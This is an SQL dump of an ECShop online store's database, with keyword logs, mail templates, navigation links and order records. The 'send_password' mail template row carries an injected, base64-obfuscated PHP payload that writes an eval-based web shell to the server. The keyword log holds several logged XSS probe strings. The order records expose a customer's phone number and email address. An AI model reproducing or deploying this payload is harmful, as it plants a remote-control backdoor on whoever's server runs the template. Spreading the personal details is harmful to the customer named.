INSERT INTO `ec22703249_keywords` VALUES ('2014-04-21', 'ecshop', '小米', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-22', 'ecshop', '手机支架', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-22', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-22', 'ecshop', '11', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-22', 'ecshop', '000000', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-23', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-24', 'BAIDU', 'ecshop灏忕背鏁寸珯妯℃澘 pc鐗', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-24', 'BAIDU', '鐧惧', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-24', 'ecshop', 'c', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-24', 'ecshop', 'mi', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-25', 'ecshop', '小米手机3', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-26', 'ecshop', '小米手机3', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-26', 'ecshop', '小米电视', '6');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-26', 'ecshop', '88888', '7');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-26', 'ecshop', '88888&lt;div', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-26', 'ecshop', 'style=width:expression(alert(42873))&gt;', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-26', 'ecshop', '88888\\&quot;', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-26', 'ecshop', 'onmousemove=alert(42873)', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-04-26', 'ecshop', 'wb=\\&quot;', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-07', 'ecshop', '变形金刚', '5');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-17', 'ecshop', '舌尖上的', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-17', 'ecshop', '1', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-17', 'ecshop', '优惠套装', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-17', 'ecshop', '百变后盖', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-17', 'ecshop', '蔬菜', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-25', 'ecshop', '小米电视', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-26', 'ecshop', '变形金刚', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-28', 'ecshop', '优惠套装', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-28', 'ecshop', '变形金刚', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-28', 'ecshop', '小米手机3', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-28', 'ecshop', '小米电视', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-07-28', 'ecshop', '百变后盖', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-01', 'ecshop', '变形金刚', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-01', 'ecshop', '优惠套装', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-01', 'ecshop', '小米电视', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-01', 'ecshop', '小米手机3', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-01', 'ecshop', '百变后盖', '3');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-02', 'ecshop', '优惠套装', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-02', 'ecshop', '小米电视', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-04', 'ecshop', '优惠套装', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-05', 'ecshop', '变形金刚', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-05', 'ecshop', '百变后盖', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-06', 'ecshop', '百变后盖', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-06', 'ecshop', '优惠套装', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-07', 'ecshop', '小米手机3', '2');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-07', 'ecshop', '优惠套装', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-07', 'ecshop', '百变后盖', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-07', 'ecshop', '小米电视', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-07', 'ecshop', '变形金刚', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-08', 'ecshop', '小米电视', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-09', 'ecshop', '优惠套装', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-10', 'ecshop', '小米手机3', '1');
INSERT INTO `ec22703249_keywords` VALUES ('2014-08-11', 'ecshop', '优惠套装', '1');

-- ----------------------------
-- Table structure for `ec22703249_link_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_link_goods`;
CREATE TABLE `ec22703249_link_goods` (
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `link_goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `is_double` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `admin_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`goods_id`,`link_goods_id`,`admin_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_link_goods
-- ----------------------------
INSERT INTO `ec22703249_link_goods` VALUES ('2', '1', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('1', '2', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('3', '1', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('1', '3', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('4', '1', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('1', '4', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('5', '1', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('1', '5', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('6', '1', '1', '1');
INSERT INTO `ec22703249_link_goods` VALUES ('1', '6', '1', '1');

-- ----------------------------
-- Table structure for `ec22703249_mail_templates`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_mail_templates`;
CREATE TABLE `ec22703249_mail_templates` (
  `template_id` tinyint(1) unsigned NOT NULL AUTO_INCREMENT,
  `template_code` varchar(30) NOT NULL DEFAULT '',
  `is_html` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `template_subject` varchar(200) NOT NULL DEFAULT '',
  `template_content` text NOT NULL,
  `last_modify` int(10) unsigned NOT NULL DEFAULT '0',
  `last_send` int(10) unsigned NOT NULL DEFAULT '0',
  `type` varchar(10) NOT NULL,
  PRIMARY KEY (`template_id`),
  UNIQUE KEY `template_code` (`template_code`),
  KEY `type` (`type`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_mail_templates
-- ----------------------------
INSERT INTO `ec22703249_mail_templates` VALUES ('1', 'send_password', '0', '密码找回', '{$user_name\'];file_put_contents(base64_decode(\'Li4vdGVtcC9zaGVsbC5waHA=\'),base64_decode(\'PD9waHAgQGV2YWwoJF9QT1NUWycyMDcnXSk7Pz4=\'));echo $var[\'$user_name}<p>{$user_name}您好！<br />\r\n<br />\r\n您已经进行了密码重置的操作，请点击以下链接(或者复制到您的浏览器):<br />\r\n<br />\r\n<a target=\"_blank\" href=\"{$reset_email}\">{$reset_email}</a><br />\r\n<br />\r\n以确认您的新密码重置操作！<br />\r\n<br />\r\n{$shop_name}<br />\r\n{$send_date}</p>', '1389747025', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('2', 'order_confirm', '0', '订单确认通知', '亲爱的{$order.consignee}，你好！ \n\n我们已经收到您于 {$order.formated_add_time} 提交的订单，该订单编号为：{$order.order_sn} 请记住这个编号以便日后的查询。\n\n{$shop_name}\n{$sent_date}\n\n\n', '1158226370', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('3', 'deliver_notice', '1', '发货通知', '亲爱的{$order.consignee}。你好！</br></br>\n\n您的订单{$order.order_sn}已于{$send_time}按照您预定的配送方式给您发货了。</br>\n</br>\n{if $order.invoice_no}发货单号是{$order.invoice_no}。</br>{/if}\n</br>\n在您收到货物之后请点击下面的链接确认您已经收到货物：</br>\n<a href=\"{$confirm_url}\" target=\"_blank\">{$confirm_url}</a></br></br>\n如果您还没有收到货物可以点击以下链接给我们留言：</br></br>\n<a href=\"{$send_msg_url}\" target=\"_blank\">{$send_msg_url}</a></br>\n<br>\n再次感谢您对我们的支持。欢迎您的再次光临。 <br>\n<br>\n{$shop_name} </br>\n{$send_date}', '1194823291', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('4', 'order_cancel', '0', '订单取消', '亲爱的{$order.consignee}，你好！ \n\n您的编号为：{$order.order_sn}的订单已取消。\n\n{$shop_name}\n{$send_date}', '1156491130', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('5', 'order_invalid', '0', '订单无效', '亲爱的{$order.consignee}，你好！\n\n您的编号为：{$order.order_sn}的订单无效。\n\n{$shop_name}\n{$send_date}', '1156491164', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('6', 'send_bonus', '0', '发红包', '亲爱的{$user_name}您好！\n\n恭喜您获得了{$count}个红包，金额{if $count > 1}分别{/if}为{$money}\n\n{$shop_name}\n{$send_date}\n', '1156491184', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('7', 'group_buy', '1', '团购商品', '亲爱的{$consignee}，您好！<br>\n<br>\n您于{$order_time}在本店参加团购商品活动，所购买的商品名称为：{$goods_name}，数量：{$goods_number}，订单号为：{$order_sn}，订单金额为：{$order_amount}<br>\n<br>\n此团购商品现在已到结束日期，并达到最低价格，您现在可以对该订单付款。<br>\n<br>\n请点击下面的链接：<br>\n<a href=\"{$shop_url}\" target=\"_blank\">{$shop_url}</a><br>\n<br>\n请尽快登录到用户中心，查看您的订单详情信息。 <br>\n<br>\n{$shop_name} <br>\n<br>\n{$send_date}', '1194824668', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('8', 'register_validate', '1', '邮件验证', '{$user_name}您好！<br><br>\r\n\r\n这封邮件是 {$shop_name} 发送的。你收到这封邮件是为了验证你注册邮件地址是否有效。如果您已经通过验证了，请忽略这封邮件。<br>\r\n请点击以下链接(或者复制到您的浏览器)来验证你的邮件地址:<br>\r\n<a href=\"{$validate_email}\" target=\"_blank\">{$validate_email}</a><br><br>\r\n\r\n{$shop_name}<br>\r\n{$send_date}', '1162201031', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('9', 'virtual_card', '0', '虚拟卡片', '亲爱的{$order.consignee}\r\n你好！您的订单{$order.order_sn}中{$goods.goods_name} 商品的详细信息如下:\r\n{foreach from=$virtual_card item=card}\r\n{if $card.card_sn}卡号：{$card.card_sn}{/if}{if $card.card_password}卡片密码：{$card.card_password}{/if}{if $card.end_date}截至日期：{$card.end_date}{/if}\r\n{/foreach}\r\n再次感谢您对我们的支持。欢迎您的再次光临。\r\n\r\n{$shop_name} \r\n{$send_date}', '1162201031', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('10', 'attention_list', '0', '关注商品', '亲爱的{$user_name}您好~\n\n您关注的商品 : {$goods_name} 最近已经更新,请您查看最新的商品信息\n\n{$goods_url}\r\n\r\n{$shop_name} \r\n{$send_date}', '1183851073', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('11', 'remind_of_new_order', '0', '新订单通知', '亲爱的店长，您好：\n   快来看看吧，又有新订单了。\n    订单号:{$order.order_sn} \n 订单金额:{$order.order_amount}，\n 用户购买商品:{foreach from=$goods_list item=goods_data}{$goods_data.goods_name}(货号:{$goods_data.goods_sn})    {/foreach} \n\n 收货人:{$order.consignee}， \n 收货人地址:{$order.address}，\n 收货人电话:{$order.tel} {$order.mobile}, \n 配送方式:{$order.shipping_name}(费用:{$order.shipping_fee}), \n 付款方式:{$order.pay_name}(费用:{$order.pay_fee})。\n\n               系统提醒\n               {$send_date}', '1196239170', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('12', 'goods_booking', '1', '缺货回复', '亲爱的{$user_name}。你好！</br></br>{$dispose_note}</br></br>您提交的缺货商品链接为</br></br><a href=\"{$goods_link}\" target=\"_blank\">{$goods_name}</a></br><br>{$shop_name} </br>{$send_date}', '0', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('13', 'user_message', '1', '留言回复', '亲爱的{$user_name}。你好！</br></br>对您的留言：</br>{$message_content}</br></br>店主作了如下回复：</br>{$message_note}</br></br>您可以随时回到店中和店主继续沟通。</br>{$shop_name}</br>{$send_date}', '0', '0', 'template');
INSERT INTO `ec22703249_mail_templates` VALUES ('14', 'recomment', '1', '用户评论回复', '亲爱的{$user_name}。你好！</br></br>对您的评论：</br>“{$comment}”</br></br>店主作了如下回复：</br>“{$recomment}”</br></br>您可以随时回到店中和店主继续沟通。</br>{$shop_name}</br>{$send_date}', '0', '0', 'template');

-- ----------------------------
-- Table structure for `ec22703249_member_price`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_member_price`;
CREATE TABLE `ec22703249_member_price` (
  `price_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `user_rank` tinyint(3) NOT NULL DEFAULT '0',
  `user_price` decimal(10,2) NOT NULL DEFAULT '0.00',
  PRIMARY KEY (`price_id`),
  KEY `goods_id` (`goods_id`,`user_rank`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_member_price
-- ----------------------------
INSERT INTO `ec22703249_member_price` VALUES ('5', '21', '1', '0.00');
INSERT INTO `ec22703249_member_price` VALUES ('6', '22', '1', '0.00');
INSERT INTO `ec22703249_member_price` VALUES ('7', '23', '1', '0.00');
INSERT INTO `ec22703249_member_price` VALUES ('8', '24', '1', '0.00');

-- ----------------------------
-- Table structure for `ec22703249_nav`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_nav`;
CREATE TABLE `ec22703249_nav` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `ctype` varchar(10) DEFAULT NULL,
  `cid` smallint(5) unsigned DEFAULT NULL,
  `name` varchar(255) NOT NULL,
  `ifshow` tinyint(1) NOT NULL,
  `vieworder` tinyint(1) NOT NULL,
  `opennew` tinyint(1) NOT NULL,
  `url` varchar(255) NOT NULL,
  `type` varchar(10) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `type` (`type`),
  KEY `ifshow` (`ifshow`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_nav
-- ----------------------------
INSERT INTO `ec22703249_nav` VALUES ('1', '', '0', '免责条款', '1', '1', '0', '#', 'bottom');
INSERT INTO `ec22703249_nav` VALUES ('2', '', '0', '隐私保护', '1', '2', '0', '#', 'bottom');
INSERT INTO `ec22703249_nav` VALUES ('3', '', '0', '咨询热点 ', '1', '3', '0', '#', 'bottom');
INSERT INTO `ec22703249_nav` VALUES ('4', '', '0', '联系我们', '1', '4', '0', '#', 'bottom');
INSERT INTO `ec22703249_nav` VALUES ('5', '', '0', '公司简介', '1', '5', '0', '#', 'bottom');
INSERT INTO `ec22703249_nav` VALUES ('6', '', '0', '批发方案', '1', '6', '0', '#', 'bottom');
INSERT INTO `ec22703249_nav` VALUES ('7', '', '0', '配送方式', '1', '7', '0', '#', 'bottom');
INSERT INTO `ec22703249_nav` VALUES ('8', 'c', '1', '蔬果类', '1', '2', '0', 'category.php?id=1', 'middle');
INSERT INTO `ec22703249_nav` VALUES ('9', 'c', '5', '其他', '1', '4', '0', 'category.php?id=5', 'middle');
INSERT INTO `ec22703249_nav` VALUES ('10', 'c', '6', '糕点产品', '1', '6', '0', 'category.php?id=6', 'middle');
INSERT INTO `ec22703249_nav` VALUES ('11', 'c', '7', '腌制产品', '1', '8', '0', 'category.php?id=7', 'middle');
INSERT INTO `ec22703249_nav` VALUES ('12', 'c', '8', '水产产品', '1', '10', '0', 'category.php?id=8', 'middle');
INSERT INTO `ec22703249_nav` VALUES ('13', '', '0', '积分商城', '1', '11', '0', 'exchange.php', 'middle');
INSERT INTO `ec22703249_nav` VALUES ('14', '', '0', '留言板', '1', '12', '0', 'message.php', 'middle');
INSERT INTO `ec22703249_nav` VALUES ('15', '', '0', 'WAP手机版', '1', '127', '1', '/mobile/', 'middle');

-- ----------------------------
-- Table structure for `ec22703249_order_action`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_order_action`;
CREATE TABLE `ec22703249_order_action` (
  `action_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `action_user` varchar(30) NOT NULL DEFAULT '',
  `order_status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `shipping_status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `pay_status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `action_place` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `action_note` varchar(255) NOT NULL DEFAULT '',
  `log_time` int(11) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`action_id`),
  KEY `order_id` (`order_id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_order_action
-- ----------------------------
INSERT INTO `ec22703249_order_action` VALUES ('1', '9', 'admin', '1', '0', '2', '0', '87989', '1407978127');
INSERT INTO `ec22703249_order_action` VALUES ('6', '11', 'admin', '1', '3', '2', '0', '备注的。。。', '1408184287');
INSERT INTO `ec22703249_order_action` VALUES ('5', '11', '套餐自动生成订单', '1', '0', '2', '0', '', '1408180153');
INSERT INTO `ec22703249_order_action` VALUES ('7', '4', 'admin', '5', '5', '0', '0', '79', '1408184371');
INSERT INTO `ec22703249_order_action` VALUES ('8', '11', 'admin', '5', '5', '2', '0', 'rwerwer', '1408333133');

-- ----------------------------
-- Table structure for `ec22703249_order_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_order_goods`;
CREATE TABLE `ec22703249_order_goods` (
  `rec_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_name` varchar(120) NOT NULL DEFAULT '',
  `goods_sn` varchar(60) NOT NULL DEFAULT '',
  `product_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_number` smallint(5) unsigned NOT NULL DEFAULT '1',
  `market_price` decimal(10,2) NOT NULL DEFAULT '0.00',
  `goods_price` decimal(10,2) NOT NULL DEFAULT '0.00',
  `goods_attr` text NOT NULL,
  `send_number` smallint(5) unsigned NOT NULL DEFAULT '0',
  `is_real` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `extension_code` varchar(30) NOT NULL DEFAULT '',
  `parent_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `is_gift` smallint(5) unsigned NOT NULL DEFAULT '0',
  `goods_attr_id` varchar(255) NOT NULL DEFAULT '',
  `package_attr_id` varchar(100) NOT NULL,
  PRIMARY KEY (`rec_id`),
  KEY `order_id` (`order_id`),
  KEY `goods_id` (`goods_id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_order_goods
-- ----------------------------
INSERT INTO `ec22703249_order_goods` VALUES ('1', '2', '10', '舌尖上的佳肴', 'ECS000010', '1', '1', '838.80', '699.00', '黑色,150/M', '0', '1', '', '0', '0', '69,76', '');
INSERT INTO `ec22703249_order_goods` VALUES ('2', '3', '6', '君禾园蚕豆', 'ECS000006', '0', '1', '21.59', '18.00', '', '0', '1', '', '0', '0', '', '');
INSERT INTO `ec22703249_order_goods` VALUES ('3', '4', '6', '君禾园蚕豆', 'ECS000006', '0', '1', '21.59', '18.00', '', '1', '1', '', '0', '0', '', '');
INSERT INTO `ec22703249_order_goods` VALUES ('4', '7', '1', '君禾园土鸡', 'ECS000000', '0', '1', '58.80', '40.00', '', '0', '1', '', '0', '0', '', '');
INSERT INTO `ec22703249_order_goods` VALUES ('5', '8', '23', '乐享品', 'ESC000019', '0', '1', '0.00', '0.00', '', '0', '0', 'virtual_card', '0', '0', '', '');
INSERT INTO `ec22703249_order_goods` VALUES ('6', '9', '24', '乐活卡', 'ESC000020', '0', '1', '11400.00', '0.00', '', '0', '0', 'virtual_card', '0', '0', '', '');
INSERT INTO `ec22703249_order_goods` VALUES ('8', '11', '1', '君禾园土鸡', 'ECS000000', '0', '1', '0.00', '49.00', '', '1', '1', '', '0', '0', '', '');
INSERT INTO `ec22703249_order_goods` VALUES ('9', '12', '24', '乐活卡', 'ESC000020', '0', '1', '11400.00', '0.00', '', '0', '0', 'virtual_card', '0', '0', '', '');

-- ----------------------------
-- Table structure for `ec22703249_order_info`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_order_info`;
CREATE TABLE `ec22703249_order_info` (
  `order_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `order_sn` varchar(20) NOT NULL DEFAULT '',
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `order_status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `shipping_status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `pay_status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `consignee` varchar(60) NOT NULL DEFAULT '',
  `country` smallint(5) unsigned NOT NULL DEFAULT '0',
  `province` smallint(5) unsigned NOT NULL DEFAULT '0',
  `city` smallint(5) unsigned NOT NULL DEFAULT '0',
  `district` smallint(5) unsigned NOT NULL DEFAULT '0',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zipcode` varchar(60) NOT NULL DEFAULT '',
  `tel` varchar(60) NOT NULL DEFAULT '',
  `mobile` varchar(60) NOT NULL DEFAULT '',
  `email` varchar(60) NOT NULL DEFAULT '',
  `best_time` varchar(120) NOT NULL DEFAULT '',
  `sign_building` varchar(120) NOT NULL DEFAULT '',
  `postscript` varchar(255) NOT NULL DEFAULT '',
  `shipping_id` tinyint(3) NOT NULL DEFAULT '0',
  `shipping_name` varchar(120) NOT NULL DEFAULT '',
  `pay_id` tinyint(3) NOT NULL DEFAULT '0',
  `pay_name` varchar(120) NOT NULL DEFAULT '',
  `how_oos` varchar(120) NOT NULL DEFAULT '',
  `how_surplus` varchar(120) NOT NULL DEFAULT '',
  `pack_name` varchar(120) NOT NULL DEFAULT '',
  `card_name` varchar(120) NOT NULL DEFAULT '',
  `card_message` varchar(255) NOT NULL DEFAULT '',
  `inv_payee` varchar(120) NOT NULL DEFAULT '',
  `inv_content` varchar(120) NOT NULL DEFAULT '',
  `goods_amount` decimal(10,2) NOT NULL DEFAULT '0.00',
  `shipping_fee` decimal(10,2) NOT NULL DEFAULT '0.00',
  `insure_fee` decimal(10,2) NOT NULL DEFAULT '0.00',
  `pay_fee` decimal(10,2) NOT NULL DEFAULT '0.00',
  `pack_fee` decimal(10,2) NOT NULL DEFAULT '0.00',
  `card_fee` decimal(10,2) NOT NULL DEFAULT '0.00',
  `money_paid` decimal(10,2) NOT NULL DEFAULT '0.00',
  `surplus` decimal(10,2) NOT NULL DEFAULT '0.00',
  `integral` int(10) unsigned NOT NULL DEFAULT '0',
  `integral_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `bonus` decimal(10,2) NOT NULL DEFAULT '0.00',
  `order_amount` decimal(10,2) NOT NULL DEFAULT '0.00',
  `from_ad` smallint(5) NOT NULL DEFAULT '0',
  `referer` varchar(255) NOT NULL DEFAULT '',
  `add_time` int(10) unsigned NOT NULL DEFAULT '0',
  `confirm_time` int(10) unsigned NOT NULL DEFAULT '0',
  `pay_time` int(10) unsigned NOT NULL DEFAULT '0',
  `shipping_time` int(10) unsigned NOT NULL DEFAULT '0',
  `pack_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `card_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `bonus_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `invoice_no` varchar(255) NOT NULL DEFAULT '',
  `extension_code` varchar(30) NOT NULL DEFAULT '',
  `extension_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `to_buyer` varchar(255) NOT NULL DEFAULT '',
  `pay_note` varchar(255) NOT NULL DEFAULT '',
  `agency_id` smallint(5) unsigned NOT NULL,
  `inv_type` varchar(60) NOT NULL,
  `tax` decimal(10,2) NOT NULL,
  `is_separate` tinyint(1) NOT NULL DEFAULT '0',
  `parent_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `discount` decimal(10,2) NOT NULL,
  PRIMARY KEY (`order_id`),
  UNIQUE KEY `order_sn` (`order_sn`),
  KEY `user_id` (`user_id`),
  KEY `order_status` (`order_status`),
  KEY `shipping_status` (`shipping_status`),
  KEY `pay_status` (`pay_status`),
  KEY `shipping_id` (`shipping_id`),
  KEY `pay_id` (`pay_id`),
  KEY `extension_code` (`extension_code`,`extension_id`),
  KEY `agency_id` (`agency_id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_order_info
-- ----------------------------
INSERT INTO `ec22703249_order_info` VALUES ('1', '2014070806226', '1', '3', '0', '0', '', '0', '0', '0', '0', '', '', '', '', '', '', '', '', '0', '', '0', '', '', '', '', '', '', '', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '0.00', '0', '管理员添加', '1404780380', '0', '0', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
INSERT INTO `ec22703249_order_info` VALUES ('2', '2014071779455', '1', '3', '0', '0', '', '0', '0', '0', '0', '', '', '', '', '', '', '', '', '0', '', '0', '', '', '', '', '', '', '', '', '699.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '699.00', '0', '管理员添加', '1405535671', '0', '0', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
INSERT INTO `ec22703249_order_info` VALUES ('3', '2014071768542', '5', '0', '0', '0', 'CBB', '1', '13', '180', '1544', 'CVMNMM,', '200123', '50201056', '13685634255', 'shi7881qiao@hotmail.com', '周三', '', '', '1', '上门取货', '2', '货到付款', '等待所有商品备齐后再发', '', '', '', '', '', '', '18.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '18.00', '0', '本站', '1405539913', '0', '0', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
INSERT INTO `ec22703249_order_info` VALUES ('4', '2014071863125', '5', '5', '5', '0', 'CBB', '1', '13', '180', '1544', 'CVMNMM,', '200123', '50201056', '13685634255', 'shi7881qiao@hotmail.com', '周三', '', '', '1', '上门取货', '2', '货到付款', '等待所有商品备齐后再发', '', '', '', '', '', '', '18.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '18.00', '0', '本站', '1405646744', '1408184371', '0', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
INSERT INTO `ec22703249_order_info` VALUES ('5', '2014072174163', '0', '3', '0', '0', '', '0', '0', '0', '0', '', '', '', '', '', '', '', '', '0', '', '0', '', '', '', '', '', '', '', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '0.00', '0', '管理员添加', '1405892716', '0', '0', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
INSERT INTO `ec22703249_order_info` VALUES ('6', '2014072103686', '0', '3', '0', '0', '', '0', '0', '0', '0', '', '', '', '', '', '', '', '', '0', '', '0', '', '', '', '', '', '', '', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '0.00', '0', '管理员添加', '1405892798', '0', '0', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
INSERT INTO `ec22703249_order_info` VALUES ('7', '2014072529503', '0', '3', '0', '0', '', '0', '0', '0', '0', '', '', '', '', '', '', '', '', '0', '', '0', '', '', '', '', '', '', '', '', '40.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '0', '0.00', '0.00', '40.00', '0', '管理员添加', '1406247409', '0', '0', '0', '0', '0', '0', '', '', '0', '', '', '0', '', '0.00', '0', '0', '0.00');
